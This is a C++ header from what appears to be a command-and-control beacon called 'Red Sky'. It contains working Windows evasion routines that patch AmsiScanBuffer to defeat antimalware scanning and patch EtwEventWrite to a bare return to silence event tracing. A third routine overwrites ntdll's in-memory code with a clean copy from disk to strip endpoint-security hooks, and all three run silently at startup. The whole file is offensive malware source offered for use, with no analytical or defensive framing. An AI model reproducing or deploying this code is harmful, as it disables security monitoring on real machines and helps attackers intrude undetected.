// language: C++, file: evade.hpp, target: Red Sky beacon — AMSI/ETW patch, NTDLL unhook
// Applied at startup. Silently no-ops if any target function is missing.

#pragma once
#include <windows.h>
#include <cstring>

namespace rs { namespace evade {

inline bool patch_amsi() {
    HMODULE amsi = LoadLibraryA("amsi.dll");
    if (!amsi) return false;
    void* fn = (void*)GetProcAddress(amsi, "AmsiScanBuffer");
    if (!fn) return false;
    DWORD old;
    if (!VirtualProtect(fn, 6, PAGE_EXECUTE_READWRITE, &old)) return false;
    // mov eax, 0x80070057 ; ret
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    memcpy(fn, patch, sizeof(patch));
    VirtualProtect(fn, 6, old, &old);
    return true;
}

inline bool patch_etw() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return false;
    void* fn = (void*)GetProcAddress(ntdll, "EtwEventWrite");
    if (!fn) return false;
    DWORD old;
    if (!VirtualProtect(fn, 1, PAGE_EXECUTE_READWRITE, &old)) return false;
    *(BYTE*)fn = 0xC3;  // ret
    VirtualProtect(fn, 1, old, &old);
    return true;
}

inline bool unhook_ntdll() {
    HMODULE live = GetModuleHandleA("ntdll.dll");
    if (!live) return false;

    HANDLE f = CreateFileW(L"C:\\Windows\\System32\\ntdll.dll", GENERIC_READ,
                           FILE_SHARE_READ, nullptr, OPEN_EXISTING, 0, nullptr);
    if (f == INVALID_HANDLE_VALUE) return false;

    HANDLE map = CreateFileMappingW(f, nullptr, PAGE_READONLY | SEC_IMAGE, 0, 0, nullptr);
    if (!map) { CloseHandle(f); return false; }

    void* clean = MapViewOfFile(map, FILE_MAP_READ, 0, 0, 0);
    if (!clean) { CloseHandle(map); CloseHandle(f); return false; }

    auto dos = (IMAGE_DOS_HEADER*)clean;
    auto nt  = (IMAGE_NT_HEADERS*)((BYTE*)clean + dos->e_lfanew);
    auto sec = IMAGE_FIRST_SECTION(nt);

    BYTE* base = (BYTE*)live;
    DWORD old;
    for (int i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
        if (sec->Characteristics & IMAGE_SCN_MEM_EXECUTE) {
            VirtualProtect(base + sec->VirtualAddress, sec->Misc.VirtualSize,
                           PAGE_EXECUTE_READWRITE, &old);
            memcpy(base + sec->VirtualAddress,
                   (BYTE*)clean + sec->VirtualAddress,
                   sec->Misc.VirtualSize);
            VirtualProtect(base + sec->VirtualAddress, sec->Misc.VirtualSize, old, &old);
        }
    }
    UnmapViewOfFile(clean);
    CloseHandle(map);
    CloseHandle(f);
    return true;
}

inline void init() {
    patch_amsi();
    patch_etw();
    unhook_ntdll();
}

}} // namespace rs::evade
